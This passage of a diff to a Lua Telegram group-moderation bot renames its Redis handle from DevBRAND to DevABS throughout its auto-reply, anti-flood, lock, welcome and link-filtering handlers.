+sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevABS:get(BRAND.."BRAND:Video:AllRed"..msg.content_.text_))
 end
-if DevBRAND:get(BRAND.."BRAND:File:AllRed"..msg.content_.text_) then
-sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevBRAND:get(BRAND.."BRAND:File:AllRed"..msg.content_.text_))
+if DevABS:get(BRAND.."BRAND:File:AllRed"..msg.content_.text_) then
+sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevABS:get(BRAND.."BRAND:File:AllRed"..msg.content_.text_))
 end
-if DevBRAND:get(BRAND.."BRAND:Voice:AllRed"..msg.content_.text_)  then
-sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevBRAND:get(BRAND.."BRAND:Voice:AllRed"..msg.content_.text_))
+if DevABS:get(BRAND.."BRAND:Voice:AllRed"..msg.content_.text_)  then
+sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevABS:get(BRAND.."BRAND:Voice:AllRed"..msg.content_.text_))
 end
-if DevBRAND:get(BRAND.."BRAND:Audio:AllRed"..msg.content_.text_)  then
-sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevBRAND:get(BRAND.."BRAND:Audio:AllRed"..msg.content_.text_))
+if DevABS:get(BRAND.."BRAND:Audio:AllRed"..msg.content_.text_)  then
+sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevABS:get(BRAND.."BRAND:Audio:AllRed"..msg.content_.text_))
 end
-if DevBRAND:get(BRAND.."BRAND:Photo:AllRed"..msg.content_.text_)  then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevBRAND:get(BRAND.."BRAND:Photo:AllRed"..msg.content_.text_))
+if DevABS:get(BRAND.."BRAND:Photo:AllRed"..msg.content_.text_)  then
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevABS:get(BRAND.."BRAND:Photo:AllRed"..msg.content_.text_))
 end
-if  DevBRAND:get(BRAND.."BRAND:Gif:AllRed"..msg.content_.text_) then
-sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevBRAND:get(BRAND.."BRAND:Gif:AllRed"..msg.content_.text_))
+if  DevABS:get(BRAND.."BRAND:Gif:AllRed"..msg.content_.text_) then
+sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevABS:get(BRAND.."BRAND:Gif:AllRed"..msg.content_.text_))
 end
-if DevBRAND:get(BRAND.."BRAND:Stecker:AllRed"..msg.content_.text_) then
-sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevBRAND:get(BRAND.."BRAND:Stecker:AllRed"..msg.content_.text_))
+if DevABS:get(BRAND.."BRAND:Stecker:AllRed"..msg.content_.text_) then
+sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevABS:get(BRAND.."BRAND:Stecker:AllRed"..msg.content_.text_))
 end
-if DevBRAND:get(BRAND.."BRAND:Text:AllRed"..msg.content_.text_) then
+if DevABS:get(BRAND.."BRAND:Text:AllRed"..msg.content_.text_) then
 function BRANDTTEAM(extra,result,success)
 if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
-local edit_msg = DevBRAND:get(BRAND..'BRAND:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
-local user_msgs = DevBRAND:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
-local Text = DevBRAND:get(BRAND.."BRAND:Text:AllRed"..msg.content_.text_)
+local edit_msg = DevABS:get(BRAND..'BRAND:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
+local user_msgs = DevABS:get(BRAND..'BRAND:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
+local Text = DevABS:get(BRAND.."BRAND:Text:AllRed"..msg.content_.text_)
 local Text = Text:gsub('#username',(username or 'لا يوجد')) 
 local Text = Text:gsub('#name','['..result.first_name_..']')
 local Text = Text:gsub('#id',msg.sender_user_id_)
@@ -2449,9 +2449,9 @@ if Type == "del" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
 return false  
 end 
-if Type == "keed" and not DevBRAND:sismember(BRAND..'BRAND:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
+if Type == "keed" and not DevABS:sismember(BRAND..'BRAND:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
 https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."") 
-DevBRAND:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
 my_ide = msg.sender_user_id_
 msgm = msg.id_
 local num = 100
@@ -2467,8 +2467,8 @@ Text = '⌁︙العضو ↫ '..GetName..' \n⌁︙قام بالتكرار ال�
 SendText(msg.chat_id_,Text,0,'md')
 return false  
 end  
-if Type == "mute" and not DevBRAND:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_, msg.sender_user_id_) then
-DevBRAND:sadd(BRAND..'BRAND:Muted:'..msg.chat_id_,msg.sender_user_id_)
+if Type == "mute" and not DevABS:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_, msg.sender_user_id_) then
+DevABS:sadd(BRAND..'BRAND:Muted:'..msg.chat_id_,msg.sender_user_id_)
 my_ide = msg.sender_user_id_
 msgm = msg.id_
 local num = 100
@@ -2489,25 +2489,25 @@ end
 --  end functions BRAND --
 --     Source BRAND     --
 --       Spam Check       --
-if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
+if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
 if msg.sender_user_id_ ~= BRAND then
-floods = DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
-Num_Msg_Max = DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
-Time_Spam = DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
-local post_count = tonumber(DevBRAND:get(BRAND.."BRAND:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
-if post_count > tonumber(DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
+floods = DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
+Num_Msg_Max = DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
+Time_Spam = DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
+local post_count = tonumber(DevABS:get(BRAND.."BRAND:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
+if post_count > tonumber(DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
 local ch = msg.chat_id_
-local type = DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Spam:User") 
+local type = DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Spam:User") 
 NotSpam(msg,type)  
 end
-DevBRAND:setex(BRAND.."BRAND:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
+DevABS:setex(BRAND.."BRAND:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
 local edit_id = data.text_ or "nil"  
 Num_Msg_Max = 5
-if DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
-Num_Msg_Max = DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
+if DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
+Num_Msg_Max = DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
 end
-if DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
-Time_Spam = DevBRAND:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
+if DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
+Time_Spam = DevABS:hget(BRAND.."BRAND:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
 end 
 end
 end 
@@ -2533,20 +2533,20 @@ return false
 end
 if msg.content_.ID == "MessagePinMessage" then
 if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(BRAND) then
-DevBRAND:set(BRAND..'BRAND:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
+DevABS:set(BRAND..'BRAND:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
 else
-local pin_id = DevBRAND:get(BRAND..'BRAND:PinnedMsg'..msg.chat_id_)
-if pin_id and DevBRAND:get(BRAND..'BRAND:Lock:Pin'..msg.chat_id_) then
+local pin_id = DevABS:get(BRAND..'BRAND:PinnedMsg'..msg.chat_id_)
+if pin_id and DevABS:get(BRAND..'BRAND:Lock:Pin'..msg.chat_id_) then
 pinmsg(msg.chat_id_,pin_id,0)
 end
 end
 end
-if DevBRAND:get(BRAND..'BRAND:viewget'..msg.sender_user_id_) then
+if DevABS:get(BRAND..'BRAND:viewget'..msg.sender_user_id_) then
 if not msg.forward_info_ then
-DevBRAND:del(BRAND..'BRAND:viewget'..msg.sender_user_id_)
+DevABS:del(BRAND..'BRAND:viewget'..msg.sender_user_id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙عدد مشاهدات المنشور هي ↫ ('..msg.views_..')', 1, 'md')
-DevBRAND:del(BRAND..'BRAND:viewget'..msg.sender_user_id_)
+DevABS:del(BRAND..'BRAND:viewget'..msg.sender_user_id_)
 end
 end
 --     Source BRAND     --
@@ -2554,44 +2554,44 @@ end
 if msg.content_.ID == "MessagePhoto" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevBRAND:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Photo'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Photo'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 if msg.content_.caption_ then
 Filters(msg, msg.content_.caption_)
-if DevBRAND:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("#") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevBRAND:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
@@ -2600,7 +2600,7 @@ end
 --     Source BRAND     --
 --        Markdown        --
 elseif not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
-if DevBRAND:get(BRAND..'BRAND:Lock:Markdown'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Markdown'..msg.chat_id_) then
 if not VipMem(msg) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
@@ -2610,44 +2610,44 @@ end
 elseif msg.content_.ID == "MessageDocument" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevBRAND:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Document'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Document'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 if msg.content_.caption_ then
 Filters(msg, msg.content_.caption_)
-if DevBRAND:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("#") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevBRAND:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
@@ -2657,7 +2657,7 @@ end
 --         Inline         --
 elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
 if not VipMem(msg) then
-if DevBRAND:get(BRAND..'BRAND:Lock:Inline'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Inline'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
@@ -2665,18 +2665,18 @@ end
 --        Sticker         --
 elseif msg.content_.ID == "MessageSticker" then
 if not VipMem(msg) then
-if DevBRAND:get(BRAND..'BRAND:Lock:Stickers'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Stickers'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 elseif msg.content_.ID == "MessageChatJoinByLink" then
-if DevBRAND:get(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 return
 end
 function get_welcome(extra,result,success)
-if DevBRAND:get(BRAND..'BRAND:Groups:Welcomes'..msg.chat_id_) then
-Welcomes = DevBRAND:get(BRAND..'BRAND:Groups:Welcomes'..msg.chat_id_)
+if DevABS:get(BRAND..'BRAND:Groups:Welcomes'..msg.chat_id_) then
+Welcomes = DevABS:get(BRAND..'BRAND:Groups:Welcomes'..msg.chat_id_)
 else
 Welcomes = '• نورت حبي \n• firstname \n• username'
 end
@@ -2685,20 +2685,20 @@ local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
 local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@CXRCX]'))
 Dev_BRAND(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
 end 
-if DevBRAND:get(BRAND.."BRAND:Lock:Welcome"..msg.chat_id_) then
+if DevABS:get(BRAND.."BRAND:Lock:Welcome"..msg.chat_id_) then
 getUser(msg.sender_user_id_,get_welcome)
 end
 --     Source BRAND     --
 --      New User Add      --
 elseif msg.content_.ID == "MessageChatAddMembers" then
-if not DevBRAND:get(BRAND..'BRAND:Lock:BotWelcome') then 
+if not DevABS:get(BRAND..'BRAND:Lock:BotWelcome') then 
 tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = BRAND,offset_ = 0,limit_ = 1},function(extra,abbas,success) 
 for i=0,#msg.content_.members_ do    
 BotWelcome = msg.content_.members_[i].id_    
 if BotWelcome and BotWelcome == tonumber(BRAND) then 
-if DevBRAND:sismember(BRAND..'BRAND:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n⌁︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n⌁︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n⌁︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
-if DevBRAND:get(BRAND.."BRAND:Text:BotWelcome") then BRANDText = DevBRAND:get(BRAND.."BRAND:Text:BotWelcome") else BRANDText = "⌁︙مرحبا انا بوت اسمي "..NameBot.."\n⌁︙حالة المجموعه ↫ "..BotText.."\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉" end 
-if DevBRAND:get(BRAND.."BRAND:Photo:BotWelcome") then BRANDPhoto = DevBRAND:get(BRAND.."BRAND:Photo:BotWelcome") elseif abbas.photos_[0] then BRANDPhoto = abbas.photos_[0].sizes_[1].photo_.persistent_id_ else BRANDPhoto = nil end 
+if DevABS:sismember(BRAND..'BRAND:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n⌁︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n⌁︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n⌁︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
+if DevABS:get(BRAND.."BRAND:Text:BotWelcome") then BRANDText = DevABS:get(BRAND.."BRAND:Text:BotWelcome") else BRANDText = "⌁︙مرحبا انا بوت اسمي "..NameBot.."\n⌁︙حالة المجموعه ↫ "..BotText.."\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉" end 
+if DevABS:get(BRAND.."BRAND:Photo:BotWelcome") then BRANDPhoto = DevABS:get(BRAND.."BRAND:Photo:BotWelcome") elseif abbas.photos_[0] then BRANDPhoto = abbas.photos_[0].sizes_[1].photo_.persistent_id_ else BRANDPhoto = nil end 
 if BRANDPhoto ~= nil then
 sendPhoto(msg.chat_id_,msg.id_,0,1,nil,BRANDPhoto,BRANDText)
 else 
@@ -2708,7 +2708,7 @@ end
 end
 end,nil)
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:TagServr'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 return
 end
@@ -2722,9 +2722,9 @@ ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
 DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
 return false
 end
-if DevBRAND:get(BRAND.."BRAND:Lock:Welcome"..msg.chat_id_) then
-if DevBRAND:get(BRAND..'BRAND:Groups:Welcomes'..msg.chat_id_) then
-Welcomes = DevBRAND:get(BRAND..'BRAND:Groups:Welcomes'..msg.chat_id_)
+if DevABS:get(BRAND.."BRAND:Lock:Welcome"..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Groups:Welcomes'..msg.chat_id_) then
+Welcomes = DevABS:get(BRAND..'BRAND:Groups:Welcomes'..msg.chat_id_)
 else
 Welcomes = '• نورت حبي \n• firstname \n• username'
 end
@@ -2738,13 +2738,13 @@ end
 elseif msg.content_.ID == "MessageContact" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevBRAND:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Contact'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Contact'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
@@ -2753,44 +2753,44 @@ end
 elseif msg.content_.ID == "MessageAudio" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevBRAND:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Music'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Music'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 if msg.content_.caption_ then
 Filters(msg, msg.content_.caption_)
-if DevBRAND:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("#") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
-if DevBRAND:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:WebLinks'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[\216-\219][\128-\191]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Arabic'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
-if DevBRAND:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
@@ -2801,44 +2801,44 @@ end
 elseif msg.content_.ID == "MessageVoice" then
 if not VipMem(msg) then
 if msg.forward_info_ then
-if DevBRAND:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Forwards'..msg.chat_id_) then
 if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Voice'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Voice'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 if msg.content_.caption_ then
 Filters(msg, msg.content_.caption_)
-if DevBRAND:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Links'..msg.chat_id_) then
 if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
-if DevBRAND:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Tags'..msg.chat_id_) then
 if msg.content_.caption_:match("@") then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 if msg.content_.caption_:match("#") then
-if DevBRAND:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
+if DevABS:get(BRAND..'BRAND:Lock:Hashtak'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
